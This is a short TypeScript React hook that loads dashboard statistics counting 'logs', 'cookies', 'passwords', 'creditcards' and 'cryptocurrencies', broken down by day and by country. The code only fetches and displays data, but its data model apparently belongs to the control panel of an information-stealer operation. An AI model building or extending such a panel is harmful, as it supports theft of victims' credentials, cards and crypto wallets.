import { api } from "@/lib/api"
import { useEffect, useState } from "react"

export interface Stats {
    totals: {
        logs: number
        cookies: number
        passwords: number
        creditcards: number
        cryptocurrencies: number
    }
    byDay: { date: string; count: number }[]
    byCountry: { country: string; count: number }[]
}

export function useStats() {
    const [stats, setStats] = useState<Stats | null>(null)
    const [isLoading, setIsLoading] = useState(true)
    const [error, setError] = useState<string | null>(null)

    useEffect(() => {
        api<Stats>('/logs/stats')
            .then(setStats)
            .catch((err) => setError(err instanceof Error ? err.message : 'Failed to load stats'))
            .finally(() => setIsLoading(false))
    }, [])

    return { stats, isLoading, error }
}
